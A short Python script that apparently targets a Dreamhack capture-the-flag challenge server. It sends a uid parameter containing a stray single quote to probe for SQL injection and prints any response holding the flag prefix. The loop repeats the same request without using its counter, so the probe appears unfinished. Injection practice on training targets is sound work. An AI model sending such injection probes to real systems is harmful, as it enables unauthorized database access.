import requests

r = requests.session()
url = "http://host3.dreamhack.games:15471/?uid="
for i in range(0, 256):
    param = "asdf'"
    res = r.get(url + param)
    if "DH" in res.text:
        print(res.text)